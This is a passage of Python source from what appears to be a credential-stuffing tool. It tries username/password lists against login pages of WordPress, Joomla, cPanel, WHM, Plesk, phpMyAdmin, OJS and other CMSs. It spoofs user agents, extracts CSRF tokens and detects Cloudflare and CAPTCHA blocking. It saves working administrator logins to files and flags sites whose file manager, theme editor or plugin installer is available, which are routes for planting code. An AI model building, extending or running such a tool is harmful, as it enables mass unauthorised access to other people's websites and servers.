                                    found_indicators.append('edit_themes(3)')
                                
                                if has_admin_ajax:
                                    admin_score += 2
                                    found_indicators.append('admin_ajax(2)')
                                
                                if has_load_scripts:
                                    admin_score += 2
                                    found_indicators.append('load_scripts(2)')
                                
                                if has_admin_css:
                                    admin_score += 2
                                    found_indicators.append('admin_css(2)')
                                
                                if has_admin_js:
                                    admin_score += 2
                                    found_indicators.append('admin_js(2)')
                                
                                if has_dashicons:
                                    admin_score += 2
                                    found_indicators.append('dashicons(2)')
                                
                                if has_logout_link:
                                    admin_score += 2
                                    found_indicators.append('logout(2)')
                                
                                if has_wp_content:
                                    admin_score += 1
                                    found_indicators.append('wp_content(1)')
                                
                                if has_wp_footer:
                                    admin_score += 1
                                    found_indicators.append('wp_footer(1)')
                                
                                if self.debug_mode.get():
                                    self.log(f"  WP: Score={admin_score} | Strong={strong_indicator_count}", "cyan")
                                    if found_indicators:
                                        self.log(f"  WP: Found: {', '.join(found_indicators[:6])}", "gray")
                                
                                
                                if has_howdy:
                                    is_admin = True
                                    detection_method = "Howdy Greeting"
                                    if self.debug_mode.get():
                                        self.log(f"  WP Role: ✓ administrator (Howdy!)", "green")
                                
                                elif has_dashboard_widgets:
                                    is_admin = True
                                    detection_method = "Dashboard Widgets"
                                    self.log(f"  WP Role: ✓ administrator (Widgets!)", "green")
                                
                                elif has_admin_menu and has_admin_bar:
                                    is_admin = True
                                    detection_method = "Admin Menu+Bar"
                                    self.log(f"  WP Role: ✓ administrator (Menu+Bar!)", "green")
                                
                                elif admin_score >= 15 and strong_indicator_count >= 2:
                                    is_admin = True
                                    detection_method = f"High Score ({admin_score}, {strong_indicator_count} strong)"
                                    self.log(f"  WP Role: ✓ administrator (score {admin_score})", "green")
                                
                                elif admin_score >= 12 and strong_indicator_count >= 3:
                                    is_admin = True
                                    detection_method = f"Medium-High ({admin_score}, {strong_indicator_count} strong)"
                                    self.log(f"  WP Role: ✓ administrator (score {admin_score})", "green")
                                
                                elif admin_score >= 10 and (has_welcome_panel or has_screen_options) and strong_indicator_count >= 2:
                                    is_admin = True
                                    detection_method = f"Medium Score ({admin_score}, special)"
                                    self.log(f"  WP Role: ✓ administrator (score {admin_score})", "green")
                                
                                else:
                                    self.log(f"  WP Role: ✗ NOT admin (score {admin_score}, strong {strong_indicator_count})", "yellow")
                                    if self.debug_mode.get():
                                        self.log(f"  WP: Need: score ≥10 + special OR score ≥12 + 3 strong OR score ≥15 + 2 strong", "gray")
                            
                            else:
                                if self.debug_mode.get():
                                    self.log(f"  WP: Dashboard test failed (not in wp-admin area)", "yellow")
                                
                                if 'profile.php' in final_url:
                                    if self.debug_mode.get():
                                        self.log(f"  WP Role: subscriber (profile-only)", "yellow")
                                elif any(p in final_url for p in ['/shop/', '/my-account/']):
                                    self.log(f"  WP Role: customer (shop)", "yellow")
                                elif 'wp-login.php' in final_url:
                                    self.log(f"  WP: ✗ Redirected to login (invalid session?)", "red")
                        
                        except Exception as e:
                            self.log(f"  WP: ✗ Dashboard ERROR: {str(e)[:60]}", "red")
                            if self.debug_mode.get():
                                import traceback
                                self.log(f"  {traceback.format_exc()[:150]}", "gray")
                        
                        if not is_admin:
                            try:
                                api_url = f"{url.rstrip('/')}/wp-json/wp/v2/users/me"
                                api_resp = session.get(api_url, timeout=8)
                                
                                if self.debug_mode.get():
                                    self.log(f"  WP: REST API fallback: {api_resp.status_code}", "cyan")
                                
                                if api_resp.status_code == 200:
                                    data = api_resp.json()
                                    if isinstance(data, dict) and 'roles' in data and isinstance(data['roles'], list):
                                        if data['roles']:
                                            role = data['roles'][0]
                                            
                                            if self.debug_mode.get():
                                                self.log(f"  WP: REST API role: {role}", "cyan")
                                            
                                            if role.lower() == 'administrator':
                                                is_admin = True
                                                detection_method = f"REST API (administrator)"
                                                self.log(f"  WP Role: ✓ administrator (REST API)", "green")
                                            else:
                                                if self.debug_mode.get():
                                                    self.log(f"  WP Role: {role} (not administrator)", "yellow")
                            except Exception as e:
                                if self.debug_mode.get():
                                    self.log(f"  WP: REST API error: {str(e)[:40]}", "yellow")
                        
                        if is_admin:
                            self.log(f"  WP: ✅ ADMIN via {detection_method}", "green")
                            
                            try:
                                if not admin_file:
                                    self.log(f"  WP: ✗ ERROR - admin_file variable is None!", "red")
                                else:
                                    with open(admin_file, 'a', encoding='utf-8', buffering=1) as f:
                                        f.write(f"{actual_url}|{user}|{pwd}\n")
                                        f.flush()
                                    self.log(f"  WP: ✅ Saved to Good_WP_Administrator.txt", "green")
                            except Exception as e:
                                self.log(f"  WP: ✗ Admin save ERROR: {str(e)}", "red")
                            
                            extras_checked = 0
                            extras_found = 0
                            
                            try:
                                extras_checked += 1
                                has_filemanager = False
                                
                                if self.debug_mode.get():
                                    self.log(f"    Checking filemanager (from dashboard)...", "cyan")
                                
                                txt_lower = txt.lower()
                                
                                filemanager_indicators = [
                                    'toplevel_page_wp_file_manager',
                                    'toplevel_page-wp-file-manager',
                                    'toplevel_page_file-manager',
                                    'toplevel_page_filemanager',
                                    'menu-top toplevel_page_file',
                                    
                                    '>file manager<',
                                    '>wp file manager<',
                                    '>filemanager<',
                                    
                                    'admin.php?page=wp_file_manager',
                                    'admin.php?page=file_manager',
                                    'admin.php?page=filemanager',
                                    'admin.php?page=wp-file-manager',
                                    
                                    'admin.php?page=file-manager',
                                    'admin.php?page=njt-fs-filemanager',
                                    'admin.php?page=file_manager_advanced',
                                ]
                                
                                found_indicators = []
                                for indicator in filemanager_indicators:
                                    if indicator in txt_lower:
                                        has_filemanager = True
                                        found_indicators.append(indicator)
                                
                                if has_filemanager:
                                    extras_found += 1
                                    
                                    if self.debug_mode.get():
                                        self.log(f"    ✅ Filemanager detected: {found_indicators[0]}", "green")
                                    
                                    try:
                                        with open(fm_file, 'a', encoding='utf-8', buffering=1) as f:
                                            f.write(f"{actual_url}|{user}|{pwd}\n")
                                            f.flush()
                                        self.log(f"  └─ 📁 Filemanager ✅", "green")
                                    except Exception as e:
                                        if self.debug_mode.get():
                                            self.log(f"  └─ 📁 Filemanager save error: {str(e)[:40]}", "yellow")
                                else:
                                    if self.debug_mode.get():
                                        self.log(f"    ❌ Filemanager not found in menu", "gray")
                            
                            except Exception as e:
                                if self.debug_mode.get():
                                    self.log(f"    Filemanager check error: {str(e)[:40]}", "yellow")
                            
                            try:
                                extras_checked += 1
                                has_appearance = False
                                
                                if self.debug_mode.get():
                                    self.log(f"    Checking appearance (from dashboard)...", "cyan")
                                
                                if 'id="menu-appearance"' in txt_lower:
                                    appearance_start = txt_lower.find('id="menu-appearance"')
                                    
                                    if appearance_start != -1:
                                        appearance_section = txt[appearance_start:appearance_start+2000].lower()
                                        
                                        editor_indicators = [
                                            'theme-editor.php',
                                            '>editor<',
                                            '>theme editor<',
                                            'customize.php',
                                        ]
                                        
                                        found_indicators = []
                                        for indicator in editor_indicators:
                                            if indicator in appearance_section:
                                                has_appearance = True
                                                found_indicators.append(indicator)
                                        
                                        if has_appearance:
                                            extras_found += 1
                                            
                                            if self.debug_mode.get():
                                                self.log(f"    ✅ Appearance editor detected: {found_indicators[0]}", "green")
                                            
                                            try:
                                                with open(app_file, 'a', encoding='utf-8', buffering=1) as f:
                                                    f.write(f"{actual_url}|{user}|{pwd}\n")
                                                    f.flush()
                                                self.log(f"  └─ 🎨 Appearance ✅", "green")
                                            except Exception as e:
                                                if self.debug_mode.get():
                                                    self.log(f"  └─ 🎨 Appearance save error: {str(e)[:40]}", "yellow")
                                        else:
                                            if self.debug_mode.get():
                                                self.log(f"    ❌ Editor not found in Appearance menu (DISALLOW_FILE_EDIT?)", "gray")
                                else:
                                    if self.debug_mode.get():
                                        self.log(f"    ❌ Appearance menu not found", "gray")
                            
                            except Exception as e:
                                if self.debug_mode.get():
                                    self.log(f"    Appearance check error: {str(e)[:40]}", "yellow")
                            
                            try:
                                extras_checked += 1
                                has_plugin_install = False
                                
                                if self.debug_mode.get():
                                    self.log(f"    Checking plugin install (from dashboard)...", "cyan")
                                
                                if 'id="menu-plugins"' in txt_lower:
                                    plugins_start = txt_lower.find('id="menu-plugins"')
                                    
                                    if plugins_start != -1:
                                        plugins_section = txt[plugins_start:plugins_start+2000].lower()
                                        
                                        install_indicators = [
                                            'plugin-install.php',
                                            '>add new<',
                                            '>install plugins<',
                                        ]
                                        
                                        found_indicators = []
                                        for indicator in install_indicators:
                                            if indicator in plugins_section:
                                                has_plugin_install = True
                                                found_indicators.append(indicator)
                                        
                                        if has_plugin_install:
                                            extras_found += 1
                                            
                                            if self.debug_mode.get():
                                                self.log(f"    ✅ Plugin install detected: {found_indicators[0]}", "green")
                                            
                                            try:
                                                with open(plug_file, 'a', encoding='utf-8', buffering=1) as f:
                                                    f.write(f"{actual_url}|{user}|{pwd}\n")
                                                    f.flush()
                                                self.log(f"  └─ 🔌 Install Plugin ✅", "green")
                                            except Exception as e:
                                                if self.debug_mode.get():
                                                    self.log(f"  └─ 🔌 Plugin save error: {str(e)[:40]}", "yellow")
                                        else:
                                            if self.debug_mode.get():
                                                self.log(f"    ❌ Add New not found in Plugins menu (capability disabled?)", "gray")
                                else:
                                    if self.debug_mode.get():
                                        self.log(f"    ❌ Plugins menu not found", "gray")
                            
                            except Exception as e:
                                if self.debug_mode.get():
                                    self.log(f"    Plugin check error: {str(e)[:40]}", "yellow")
                            
                            if extras_checked > 0:
                                self.log(f"  WP: Extras: {extras_found}/{extras_checked}", "cyan")

                        else:
                            self.log(f"  WP: Not admin - score={admin_score}, strong={strong_indicator_count}", "yellow")
                    
                    else:
                        self.log(f"  WP: ✗ No valid session - cannot check admin", "red")
                
                if cms == 'ojs':
                    session = None
                    
                    if reason and reason != "Authenticated":
                        if hasattr(reason, 'get') and hasattr(reason, 'cookies'):
                            session = reason
                            if self.debug_mode.get():
                                self.log(f"  OJS: ✓ Session object validated", "cyan")
                    
                    if session:
                        result = self.check_ojs_admin_role_strict(session, url)
                        is_admin, role, version, admin_url, journal_name = result
                        
                        if is_admin and admin_file:
                            try:
                                with open(admin_file, 'a', encoding='utf-8', buffering=1) as f:
                                    f.write(f"{admin_url}|{user}|{pwd}\n")
                                    f.flush()
                                self.log(f"  OJS: ✅ {role} - {journal_name} (OJS v{version})", "green")
                            except Exception as e:
                                if self.debug_mode.get():
                                    self.log(f"  OJS: Admin save ERROR: {str(e)}", "red")
                        else:
                            if self.debug_mode.get():
                                self.log(f"  OJS: Not admin role", "yellow")
                    else:
                        if self.debug_mode.get():
                            self.log(f"  OJS: ✗ No valid session - cannot check role", "red")

            elif status == 'FAILED':
                msg = f"✗ FAIL: {url} | {user}"
                if self.debug_mode.get():
                    msg += f" | {pwd} - {reason}"
                self.log(msg, "red")
                self.incr_stat("✗ Fail")
            else:
                msg = f"⚠ ERR: {url}"
                if self.debug_mode.get():
                    msg += f" | {user} - {reason}"
                self.log(msg, "yellow")
                
                self.incr_stat("⚠ Err")

        except Exception as e:
            self.log(f"⚠ EXCEPTION: {url} - {e}", "yellow")
            self.incr_stat("⚠ Err")

        self.update_stat("Done", ln)
    
    def extract_joomla_csrf_token(self, session, login_url):
        try:
            if self.debug_mode.get():
                self.log(f"  JOOMLA: Extracting CSRF token...", "cyan")
            
            resp = session.get(login_url, timeout=20, allow_redirects=True)
            
            if resp.status_code != 200:
                if self.debug_mode.get():
                    self.log(f"  JOOMLA: ✗ GET failed ({resp.status_code})", "red")
                return None
            
            html = resp.text
            
            protection_detected = self.detect_joomla_protection(html)
            if protection_detected:
                if self.debug_mode.get():
                    self.log(f"  JOOMLA: ⚠️ {protection_detected} detected!", "yellow")
                return None
            
            token_patterns = [
                r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([a-f0-9]{32})["\'][^>]+value=["\']1["\']',
                r'<input[^>]+name=["\']([a-f0-9]{32})["\'][^>]+type=["\']hidden["\'][^>]+value=["\']1["\']',
                
                r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([a-f0-9]{64})["\'][^>]+value=["\']1["\']',
                r'<input[^>]+name=["\']([a-f0-9]{64})["\'][^>]+type=["\']hidden["\'][^>]+value=["\']1["\']',
                
                r'<input[^>]+type=hidden[^>]+name=([a-f0-9]{32})[^>]+value=1',
                r'<input[^>]+type=hidden[^>]+name=([a-f0-9]{64})[^>]+value=1',
            ]
            
            for i, pattern in enumerate(token_patterns, 1):
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    token = match.group(1)
                    token_len = len(token)
                    
                    if self.debug_mode.get():
                        version = "3.x" if token_len == 32 else "4.x" if token_len == 64 else "unknown"
                        self.log(f"  JOOMLA: ✓ Token found! (Joomla {version}, pattern #{i})", "green")
                        self.log(f"  JOOMLA: Token={token[:16]}...{token[-8:]}", "gray")
                    
                    return token
            
            fallback_pattern = r'name=["\']?([a-f0-9]{32,64})["\']?[^>]*value=["\']?1["\']?'
            fallback_match = re.search(fallback_pattern, html, re.IGNORECASE)
            
            if fallback_match:
                token = fallback_match.group(1)
                if self.debug_mode.get():
                    self.log(f"  JOOMLA: ✓ Token found (fallback pattern)", "green")
                    self.log(f"  JOOMLA: Token={token[:16]}...{token[-8:]}", "gray")
                return token
            
            if self.debug_mode.get():
                self.log(f"  JOOMLA: ✗ No CSRF token found in HTML", "yellow")
            
            return None
            
        except requests.Timeout:
            if self.debug_mode.get():
                self.log(f"  JOOMLA: ✗ Token extraction timeout", "red")
            return None
        except Exception as e:
            if self.debug_mode.get():
                self.log(f"  JOOMLA: ✗ Token extraction error: {str(e)[:50]}", "red")
            return None
    
    def detect_joomla_protection(self, html_text):
        try:
            html_lower = html_text.lower()
            
            fireshield_blocking = [
                'fireshield security check',
                'bot protection in progress',
                'verifying you are human',
                'fireshield™',
            ]
            
            if any(indicator in html_lower for indicator in fireshield_blocking):
                return "FireShield"
            
            cloudflare_blocking = [
                'checking your browser',
                'challenge-platform',
                'cf-challenge-running',
                'please wait while we verify',
                'cloudflare ray id:',
                'attention required!',
            ]
            
            has_cloudflare_text = 'cloudflare' in html_lower
            has_challenge = any(indicator in html_lower for indicator in cloudflare_blocking)
            
            if has_cloudflare_text and has_challenge:
                return "Cloudflare Challenge"
            
            if 'recaptcha' in html_lower or 'g-recaptcha' in html_lower:
                if 'recaptcha/api' in html_lower:
                    return "reCAPTCHA"
            
            if 'hcaptcha' in html_lower or 'h-captcha' in html_lower:
                if 'hcaptcha.com' in html_lower:
                    return "hCaptcha"
            
            return None
            
        except Exception as e:
            if self.debug_mode.get():
                self.log(f"  JOOMLA: Protection detection error: {str(e)[:40]}", "yellow")
            return None

    def check_login(self, cms, url, user, pwd):
        cfg = CMS_CONFIG.get(cms)
        if not cfg:
            return ('ERROR', f'{cms} not supported')
        
        if cms == 'ojs':
            is_ojs, reason = self.verify_ojs(url)
            if not is_ojs:
                if self.debug_mode.get():
                    self.log(f"  OJS: ✗ Not an OJS site - {reason}", "yellow")
                return ('ERROR', f'Not OJS - {reason}')

        s = requests.Session()
        s.verify = False
        s.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': url
        })

        try:
            if not url.startswith('http'):
                url = f"https://{url}"
            
            parsed = urlparse(url)
            
            if cms in ['cpanel', 'whm', 'plesk', 'directadmin']:
                default_ports = {
                    'cpanel': 2083,
                    'whm': 2087,
                    'plesk': 8443,
                    'directadmin': 2222
                }
                
                expected_port = default_ports.get(cms)
                
                if parsed.port:
                    base_url = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
                else:
                    base_url = f"{parsed.scheme}://{parsed.hostname}:{expected_port}"
                
                login_path = cfg['login_url'].replace('{url}', '')
                if ':' in login_path:
                    login_path = login_path.split(':', 1)[1]
                    login_path = '/' + login_path.lstrip('0123456789').lstrip('/')
                
                login_path = login_path.lstrip('/')
                
                if parsed.path and login_path and parsed.path.endswith(login_path):
                    login_url = url
                else:
                    login_url = f"{base_url}/{login_path}"
            
            else:
                login_path = cfg['login_url'].replace('{url}', '').lstrip('/')
                
                if cms == 'phpmyadmin':
                    if url.rstrip('/').endswith('/phpmyadmin'):
                        login_url = url.rstrip('/') + '/index.php'
                    elif '/phpmyadmin/' in url:
                        base = url.split('/phpmyadmin/')[0] + '/phpmyadmin'
                        login_url = base + '/index.php'
                    else:
                        login_url = cfg['login_url'].format(url=url.rstrip('/'))
                elif cms == 'ojs':
                    if '/signIn' in url or '/login' in url:
                        login_url = url
                        if self.debug_mode.get():
                            self.log(f"DEBUG: OJS URL already has login path: {url}", "cyan")
                    elif url.endswith('/'):
                        login_url = url.rstrip('/') + '/login/signIn'
                    else:
                        login_url = url + '/login/signIn'
                    
                    if self.debug_mode.get():
                        self.log(f"DEBUG: OJS URL: {url} → {login_url}", "cyan")
                elif login_path and url.endswith(login_path):
                    login_url = url
                else:
                    login_url = cfg['login_url'].format(url=url.rstrip('/'))
            
            login_data = {k: v.format(user=user, password=pwd) for k, v in cfg['login_data'].items()}

            if cms == 'joomla':
                if self.debug_mode.get():
                    self.log(f"  JOOMLA: Starting 2-step login process...", "cyan")
                
                csrf_token = self.extract_joomla_csrf_token(s, login_url)
                
                if not csrf_token:
                    try:
                        test_resp = s.get(login_url, timeout=8)
                        protection = self.detect_joomla_protection(test_resp.text)
                        if protection:
                            if self.debug_mode.get():
                                self.log(f"  JOOMLA: ✗ {protection} blocking access", "red")
                            return ('ERROR', f'{protection} protection active')
                    except:
                        pass
                    
                    if self.debug_mode.get():
                        self.log(f"  JOOMLA: ⚠️ No CSRF token - trying without it...", "yellow")
                else:
                    login_data[csrf_token] = '1'
                    if self.debug_mode.get():
                        self.log(f"  JOOMLA: ✓ Token added to POST data", "green")
                
                if self.debug_mode.get():
                    self.log(f"  JOOMLA: POST to {login_url[:60]}", "cyan")
                
                resp = s.post(login_url, data=login_data, timeout=15, allow_redirects=True)
            
            else:
                if self.debug_mode.get():
                    self.log(f"DEBUG: POST to {login_url}", "cyan")

                try:
                    get_resp = s.get(login_url, timeout=12)
                except:
                    pass

                resp = s.post(login_url, data=login_data, timeout=15, allow_redirects=True)

            if self.debug_mode.get():
                self.log(f"DEBUG: Status={resp.status_code}, URL={resp.url[:100]}", "cyan")
                self.log(f"DEBUG: Cookies={list(s.cookies.keys())}", "cyan")

            valid, detail = self.validate_enhanced(s, cms, url, resp)
            
            if valid:
                return ('SUCCESS', detail, login_url)
            else:
                return ('FAILED', detail, login_url)

        except requests.Timeout:
            return ('ERROR', 'Timeout')
        except requests.ConnectionError as e:
            error_msg = str(e)
            if 'Connection refused' in error_msg:
                return ('ERROR', 'Connection refused')
            elif 'Name or service not known' in error_msg:
                return ('ERROR', 'DNS resolution failed')
            else:
                return ('ERROR', 'Connection error')
        except Exception as e:
            if self.debug_mode.get():
                self.log(f"DEBUG: Exception - {str(e)}", "yellow")
            return ('ERROR', str(e)[:100])

    def validate_enhanced(self, s, cms, url, resp):
        try:
            status_code = resp.status_code
            
            if status_code == 404:
                if self.debug_mode.get():
                    self.log(f"  {cms.upper()}: ✗ 404 Not Found", "red")
                return (False, "404 Not Found")
            
            if status_code >= 500:
                if self.debug_mode.get():
                    self.log(f"  {cms.upper()}: ✗ {status_code} Server Error", "red")
                return (False, f"{status_code} Server Error")
            
            if status_code == 403 and len(resp.text) < 100:
                if self.debug_mode.get():
                    self.log(f"  {cms.upper()}: ✗ 403 Forbidden", "red")
                return (False, "403 Forbidden")
            
            txt = resp.text
            cookies = s.cookies.get_dict()
            
            if cms in ['cpanel', 'whm']:
                
                if self.debug_mode.get():
                    self.log(f"  {cms.upper()}: POST Status={resp.status_code}", "cyan")
                    self.log(f"  {cms.upper()}: Final URL={resp.url}", "cyan")
                    self.log(f"  {cms.upper()}: Cookies={list(cookies.keys())}", "cyan")
                
                fail_messages = [
                    'Login Incorrect',
                    'Login Failed', 
                    'The login is invalid',
                    'incorrect login',
                    'invalid username'
                ]
                
                txt_lower = txt.lower()
                for fail_msg in fail_messages:
                    if fail_msg.lower() in txt_lower:
                        if self.debug_mode.get():
                            self.log(f"  {cms.upper()}: ✗ Error message found", "red")
                        return (False, "Login error detected")
                
                final_url = resp.url.lower()
                
                if '/login/' in final_url or '/login?' in final_url or final_url.endswith('/login'):
                    if self.debug_mode.get():
                        self.log(f"  {cms.upper()}: ✗ Still on /login/ URL", "red")
                    return (False, "Still on login page")
                
                success_urls = ['/frontend/', '/cpsess', ':2083/', ':2087/', '/paper_lantern/', '/jupiter/']
                if any(pattern in final_url for pattern in success_urls):
                    if self.debug_mode.get():
                        self.log(f"  {cms.upper()}: ✓ Redirected to panel URL", "green")
                    
                    domains = self._extract_domains_safe(s, url, txt)
                    if domains:
                        domain_list = ', '.join(domains[:5])
                        return (True, f"CPANEL_DOMAINS|{domain_list}")
                    return (True, "Authenticated")
                
                if not cookies:
                    if self.debug_mode.get():
                        self.log(f"  {cms.upper()}: ✗ No cookies set", "red")
                    return (False, "No session cookies")
                
                strong_indicators = [
                    ('href=', 'logout'),
                    ('cPanel', 'Home'),
                    ('id=', 'lnkLogout'),
                    ('Logged in as:', ''),
                    ('statsBarContent', ''),
                ]
                
                indicator_count = 0
                for pattern1, pattern2 in strong_indicators:
                    if pattern1 in txt and (not pattern2 or pattern2 in txt):
                        indicator_count += 1
                
                if self.debug_mode.get():
                    self.log(f"  {cms.upper()}: Panel indicators found: {indicator_count}/5", "cyan")
                
                if indicator_count >= 2:
                    if self.debug_mode.get():
                        self.log(f"  {cms.upper()}: ✓ Panel indicators sufficient", "green")
                    
                    domains = self._extract_domains_safe(s, url, txt)
                    if domains:
                        domain_list = ', '.join(domains[:5])
                        return (True, f"CPANEL_DOMAINS|{domain_list}")
                    return (True, "Authenticated")
                
                try:
                    from urllib.parse import urlparse
                    parsed = urlparse(url)
                    base = f"{parsed.scheme}://{parsed.netloc}"
                    
                    if cms == 'cpanel':
                        test_url = f"{base}:2083/"
                    else:
                        test_url = f"{base}:2087/"
                    
                    if self.debug_mode.get():
                        self.log(f"  {cms.upper()}: Testing dashboard: {test_url}", "cyan")
                    
                    test_resp = s.get(test_url, timeout=8, allow_redirects=True)
                    
                    if self.debug_mode.get():
                        self.log(f"  {cms.upper()}: Dashboard status={test_resp.status_code}, URL={test_resp.url[:60]}", "cyan")
                    
                    if test_resp.status_code == 200 and '/login' not in test_resp.url.lower():
                        if self.debug_mode.get():
                            self.log(f"  {cms.upper()}: ✓ Dashboard accessible", "green")
                        
                        domains = self._extract_domains_safe(s, url, test_resp.text)
                        if domains:
                            domain_list = ', '.join(domains[:5])
                            return (True, f"CPANEL_DOMAINS|{domain_list}")
                        return (True, "Authenticated")
                    
                    if '/login' in test_resp.url.lower():
                        if self.debug_mode.get():
                            self.log(f"  {cms.upper()}: ✗ Dashboard redirect to login", "red")
                        return (False, "Session invalid")
                
                except Exception as e:
                    if self.debug_mode.get():
                        self.log(f"  {cms.upper()}: Dashboard test error: {str(e)[:40]}", "yellow")
                
                if self.debug_mode.get():
                    self.log(f"  {cms.upper()}: ✗ Could not verify session", "red")
                
                return (False, "Cannot verify login")
            
            elif cms == 'wordpress':
                return self.validate_wordpress_enhanced(s, url, resp)
            
            elif cms == 'joomla':
                return self.validate_joomla_final(s, url, resp)
            
            elif cms == 'drupal':
                final_url = resp.url.lower()
                
                if '/user/login' not in final_url:
                    if 'drupal' in txt.lower() or 'toolbar' in txt.lower():
                        if self.debug_mode.get():
                            self.log(f"  DRUPAL: ✓ Logged in", "green")
                        return (True, "Authenticated")
                
                if self.debug_mode.get():
                    self.log(f"  DRUPAL: ✗ Login failed", "red")
                return (False, "Login failed")
            
            elif cms == 'ojs':
                final_url = resp.url.lower()
                txt_lower = txt.lower()
                
                if self.debug_mode.get():
                    self.log(f"  OJS: Final URL: {resp.url[:80]}", "cyan")
                    self.log(f"  OJS: Status: {resp.status_code}, Redirects: {len(resp.history)}", "cyan")
                
                if '/signin' in final_url or '/signIn' in resp.url:
                    if self.debug_mode.get():
                        self.log(f"  OJS: ✗ Still at signin/signIn URL - INVALID!", "red")
                    return (False, "Invalid credentials - stuck at signin")
                
                if resp.history:
                    redirect_chain = ' → '.join([str(r.status_code) for r in resp.history])
                    
                    if self.debug_mode.get():
                        self.log(f"  OJS: Redirect chain: {redirect_chain} → {resp.status_code}", "cyan")
                    
                    if not final_url.endswith('/login') and not final_url.endswith('/login/'):
                        if self.debug_mode.get():
                            self.log(f"  OJS: ✓ Redirected away from /login - VALID!", "green")
                        return (True, s)
                
                if final_url.endswith('/login') or final_url.endswith('/login/'):
                    error_patterns = ['invalid username or password', 'login credentials are incorrect', 'authentication failed']
                    has_error = any(error in txt_lower for error in error_patterns)
                    
                    if has_error:
                        if self.debug_mode.get():
                            self.log(f"  OJS: ✗ At /login with error message - INVALID!", "red")
                        return (False, "Invalid credentials")
                    
                    login_form_fields = ['name="username"', 'name="password"']
                    form_count = sum(1 for field in login_form_fields if field in txt_lower)
                    
                    if form_count >= 2:
                        if self.debug_mode.get():
                            self.log(f"  OJS: ✗ At /login with form present - INVALID!", "red")
                        return (False, "Invalid credentials")
                    
                    if self.debug_mode.get():
                        self.log(f"  OJS: ✓ At /login but no form - VALID!", "green")
                    return (True, s)
                
                if self.debug_mode.get():
                    self.log(f"  OJS: ✓ At different page - VALID!", "green")
                return (True, s)
            
            elif cms == 'moodle':
                final_url = resp.url.lower()
                txt_lower = txt.lower()
                
                if self.debug_mode.get():
                    self.log(f"  MOODLE: Checking response...", "cyan")
                
                if '/login/index.php' in final_url or '/login/' in final_url:
                    if self.debug_mode.get():
                        self.log(f"  MOODLE: ✗ Still on login page", "red")
                    return (False, "Still on login page")
                
                moodle_indicators = {
                    'id="page-site-index"': 2,
                    'class="usermenu"': 2,
                    'data-region="drawer"': 1,
                    'moodle-core': 1,
                    '/user/profile.php': 1,
                    '/my/': 1,
                    '/course/view.php': 1,
                }
                
                score = 0
                found_indicators = []
                
                for indicator, points in moodle_indicators.items():
                    if indicator in txt_lower:
                        score += points
                        found_indicators.append(indicator)
                
                if self.debug_mode.get():
                    self.log(f"  MOODLE: Score: {score} ({len(found_indicators)} indicators)", "cyan")
                
                if score >= 3:
                    if self.debug_mode.get():
                        self.log(f"  MOODLE: ✓ Logged in (score: {score})", "green")
                    return (True, "Authenticated")
                
                success_patterns = ['/my/', '/dashboard/', '/course/', '/user/profile']
                if any(pattern in final_url for pattern in success_patterns):
                    if self.debug_mode.get():
                        self.log(f"  MOODLE: ✓ Success URL pattern", "green")
                    return (True, "Authenticated")
                
                if self.debug_mode.get():
                    self.log(f"  MOODLE: ✗ Login failed (score: {score})", "red")
                return (False, "Login validation failed")
            
            elif cms == 'opencart':
                final_url = resp.url.lower()
                txt_lower = txt.lower()
                
                if self.debug_mode.get():
                    self.log(f"  OPENCART: Checking response...", "cyan")
                
                if '/admin/index.php?route=common/login' in final_url:
                    if self.debug_mode.get():
                        self.log(f"  OPENCART: ✗ Still on login page", "red")
                    return (False, "Still on login page")
                
                opencart_indicators = {
                    'id="header"': 1,
                    'id="menu"': 2,
                    'route=common/dashboard': 2,
                    'route=common/logout': 2,
                    'id="content"': 1,
                    'catalog/product': 1,
                    'sale/order': 1,
                    'class="fa fa-dashboard"': 1,
                }
                
                score = 0
                found_indicators = []
                
                for indicator, points in opencart_indicators.items():
                    if indicator in txt_lower:
                        score += points
                        found_indicators.append(indicator)
                
                if self.debug_mode.get():
                    self.log(f"  OPENCART: Score: {score} ({len(found_indicators)} indicators)", "cyan")
                
                if score >= 4:
                    if self.debug_mode.get():
                        self.log(f"  OPENCART: ✓ Admin access (score: {score})", "green")
                    return (True, "Authenticated")
                
                if '/admin/' in final_url and 'login' not in final_url:
                    if any(ind in txt_lower for ind in ['dashboard', 'logout', 'catalog', 'sale']):
                        if self.debug_mode.get():
                            self.log(f"  OPENCART: ✓ In admin area", "green")
                        return (True, "Authenticated")
                
                if self.debug_mode.get():
                    self.log(f"  OPENCART: ✗ Login failed (score: {score})", "red")
                return (False, "Login validation failed")
            
            elif cms in ['plesk', 'directadmin']:
                final_url = resp.url.lower()
                
                if 'login' not in final_url:
                    if cookies:
                        if self.debug_mode.get():
                            self.log(f"  {cms.upper()}: ✓ Session valid", "green")
                        return (True, "Authenticated")
                
                if self.debug_mode.get():
                    self.log(f"  {cms.upper()}: ✗ Login failed", "red")
                return (False, "Login failed")
            
            elif cms == 'phpmyadmin':
                final_url = resp.url.lower()
                txt_lower = txt.lower()
                
                if self.debug_mode.get():
                    self.log(f"  PHPMYADMIN: Improved validation starting...", "cyan")
                    self.log(f"  PHPMYADMIN: Status={status_code}, URL={final_url[:60]}", "cyan")
                
                phpmyadmin_dashboard = {
                    'navigation.php': 3,
                    'server_databases': 3,
                    'server_privileges': 3,
                    'server_status': 2,
                    'server_variables': 2,
                    'server_engines': 2,
                    
                    'main.php': 2,
                    'database_interface': 2,
                    'querywindow': 2,
                    
                    'create new database': 2,
                    'create database': 2,
                    'information_schema': 3,
                    'performance_schema': 2,
                    'phpmyadmin': 2,
                    
                    'run sql query': 2,
                    'sql query': 2,
                    'insert query': 1,
                    
                    'server version': 2,
                    'protocol version': 1,
                    'user:': 1,
                    'mysql charset': 1,
                    
                    'phpmyadmin': 1,
                }
                
                dashboard_score = 0
                found_indicators = []
                
                for indicator, points in phpmyadmin_dashboard.items():
                    if indicator in txt_lower:
                        dashboard_score += points
                        found_indicators.append(f"{indicator}({points})")
                
                if self.debug_mode.get():
                    self.log(f"  PHPMYADMIN: Dashboard score: {dashboard_score}", "cyan")
                    if found_indicators:
                        self.log(f"  PHPMYADMIN: Found: {', '.join(found_indicators[:5])}", "gray")
                
                if dashboard_score >= 8:
                    if self.debug_mode.get():
